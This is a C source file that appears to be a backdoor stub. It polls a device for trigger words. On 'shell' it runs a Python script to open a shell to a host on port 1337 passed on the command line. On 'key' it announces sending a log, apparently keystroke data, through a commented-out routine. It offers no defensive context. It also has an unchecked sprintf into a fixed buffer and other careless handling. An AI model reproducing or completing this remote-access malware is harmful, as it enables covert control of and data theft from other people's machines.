#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <paths.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEVICE "/dev/cd"
#define LOGFILE "/log.txt"
#define PORT 1337

int main(int argc, char *argv[]) {
    int fd;
    char buf[100];
    char cmd[100];
    while (1) {
        if ((fd = open(DEVICE, O_RDWR)) != -1) {
            read(fd, buf, 100);
            if (strncmp(buf, "key", 3) == 0) {
                if (fork() == 0) {
                    printf("Sending log\n");
                    //sendLog();
                    exit(0);
                }
            }
            else if (strncmp(buf, "shell", 5) == 0) {
                if (fork() == 0) {
                    printf("Sending shell\n");
                    sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
                    system(cmd);
                    return 0;
                }
            }
            else {
                sleep(1);
            }
        }
        close(fd);
    }
}
